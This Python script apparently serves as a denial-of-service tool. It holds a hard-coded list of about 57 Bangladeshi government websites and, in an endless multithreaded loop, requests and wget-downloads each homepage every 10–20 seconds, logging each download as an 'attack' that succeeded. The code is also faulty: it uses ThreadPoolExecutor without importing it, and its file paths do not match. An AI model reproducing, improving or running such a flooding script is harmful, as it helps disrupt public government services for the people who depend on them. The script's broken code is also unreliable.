import os
import random
import time
import asyncio
import subprocess
from multiprocessing import Pool, cpu_count
import logging

try:
    import requests
except ModuleNotFoundError: 
    print("Requests not found! Installing requets")
    os.system("pip install requests")
    logging.info("[!] Please restart the script")

# Dictionary of websites to visit
websites = {
"lged.gov.bd": "https://mail.lged.gov.bd",
"bangladesh.gov.bd": "http://www.bangladesh.gov.bd/mofl/fri/index.htm",
"pmo.gov.bd": "http://www.pmo.gov.bd/",
"ssf.gov.bd": "http://www.ssf.gov.bd/",
"ngoab.gov.bd": "http://www.ngoab.gov.bd/",
"cabinet.gov.bd": "http://www.cabinet.gov.bd/",
"dcdhaka.gov.bd": "http://www.dcdhaka.gov.bd/",
"lgd.gov.bd": "http://www.lgd.gov.bd/",
"dphe.gov.bd": "http://www.dphe.gov.bd/",
"moestab.gov.bd": "http://www.moestab.gov.bd/",
"mof.gov.bd": "http://www.mof.gov.bd/",
"erd.gov.bd": "http://www.erd.gov.bd/",
"barc.gov.bd": "http://www.barc.gov.bd/",
"mofdm.gov.bd": "http://www.mofdm.gov.bd/",
"dmb.gov.bd": "http://www.dmb.gov.bd/",
"mopt.gov.bd": "http://www.mopt.gov.bd/",
"bttb.gov.bd": "http://www.bttb.gov.bd/",
"mora.gov.bd": "http://www.mora.gov.bd/",
"mos.gov.bd": "http://www.mos.gov.bd/",
"plancomm.gov.bd": "http://www.plancomm.gov.bd/",
"bbs.gov.bd": "http://www.bbs.gov.bd/",
"moef.gov.bd": "http://www.moef.gov.bd/",
"bforest.gov.bd": "http://www.bforest.gov.bd/",
"bfri.gov.bd": "http://www.bfri.gov.bd/",
"mod.gov.bd": "http://www.mod.gov.bd/sob/",
"bmd.gov.bd": "http://www.bmd.gov.bd/",
"motj.gov.bd": "http://www.motj.gov.bd/ministry/html/textile.html",
"mohpw.gov.bd": "http://www.mohpw.gov.bd/",
"nha.gov.bd": "http://www.nha.gov.bd/",
"mincom.gov.bd": "http://www.mincom.gov.bd/",
"epb.gov.bd": "http://epb.gov.bd/",
"powercell.gov.bd": "http://www.powercell.gov.bd/",
"mocat.gov.bd": "http://www.mocat.gov.bd/",
"mowca.gov.bd": "http://www.mowca.gov.bd/",
"mofl.gov.bd": "http://www.mofl.gov.bd/",
"moc.gov.bd": "http://www.moc.gov.bd/",
"rhd.gov.bd": "http://www.rhd.gov.bd/",
"railway.gov.bd": "http://www.railway.gov.bd/",
"brta.gov.bd": "http://www.brta.gov.bd/",
"brtc.gov.bd": "http://www.brtc.gov.bd/",
"dtcb.gov.bd": "http://www.dtcb.gov.bd/",
"moind.gov.bd": "http://www.moind.gov.bd/",
"moedu.gov.bd": "http://www.moedu.gov.bd/",
"dshe.gov.bd": "http://www.dshe.gov.bd/",
"banbeis.gov.bd": "http://www.banbeis.gov.bd/",
"educationboard.gov.bd": "http://www.educationboard.gov.bd/",
"mopme.gov.bd": "http://www.mopme.gov.bd/",
"mosict.gov.bd": "http://www.mosict.gov.bd/",
"mowr.gov.bd": "http://www.mowr.gov.bd/",
"moca.gov.bd": "http://www.moca.gov.bd/",
"nanl.gov.bd": "http://www.nanl.gov.bd/",
"mha.gov.bd": "http://www.mha.gov.bd/",
"rab.gov.bd": "http://www.rab.gov.bd/",
"mlwa.gov.bd": "http://www.mlwa.gov.bd/",
"minlaw.gov.bd": "http://www.minlaw.gov.bd/",
"eprocure.gov.bd": "http://www.eprocure.gov.bd/resources/common/StdTenderSearch.jsp?keyword=LGED&h=t&Itemid=204",
}

async def fetch_data(site_name, url):
    try:
        logging.info(f"[!] Fetching data from {site_name}: {url}")
        response = requests.get(url)
        response.raise_for_status()
        logging.info(f"[!] Successfully fetched data from {site_name}: Status code {response.status_code}")
    except Exception as e:
        logging.error(f"[x] Failed to fetch data from {site_name}: {e}")

async def download_homepage(site_name, url):
    try:
        logging.info(f"[!] Downloading homepage of {site_name}: {url}")
        current_dir = os.getcwd()
        file_path = os.path.join(current_dir, "websites", f"{site_name}.html")
        result = subprocess.run(["wget", "--no-check-certificate", "-O", file_path, url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info(f"\n[!] Downloaded homepage of {site_name} to {file_path}")
        logging.info(f"[!] Attack succesful for {site_name}!\n")
    except subprocess.CalledProcessError as e:
        logging.error(f"[x] Failed to download homepage of {site_name}: {e}")
    except Exception as e:
        logging.error(f"[x] An unexpected error occurred: {e}")

async def delete_homepage(site_name):
    try:
        logging.info(f"[!] Deleting homepage of {site_name}")
        current_dir = os.getcwd()
        file_path = os.path.join(current_dir, f"{site_name}.html")
        os.remove(file_path)
        logging.info(f"[!] Deleted homepage of {site_name}")
    except Exception as e:
        logging.error(f"[x] Failed to delete homepage of {site_name}: {e}")

async def handle_site(site_name, url):
    try:
        await fetch_data(site_name, url)
        await download_homepage(site_name, url)
        # await delete_homepage(site_name)
        logging.info(f"[+] Successfully completed tasks for {site_name}")
    except Exception as e:
        logging.error(f"[x] Failed to process {site_name}: {e}")

def run_asyncio_tasks(site_name, url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(handle_site(site_name, url))
    finally:
        loop.close()

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

    num_threads = len(websites)
    logging.info(f"[!] Using {num_threads} threads!\n")

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        while True:
            futures = []
            for site_name, url in websites.items():
                futures.append(executor.submit(run_asyncio_tasks, site_name, url))

            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"[x] Thread execution failed: {e}")

            rand_sleep = random.randint(10, 20)
            logging.info(f"\n[!] All tasks done! Restarting in {rand_sleep} seconds...\n")
            time.sleep(rand_sleep)

if __name__ == "__main__":
    main()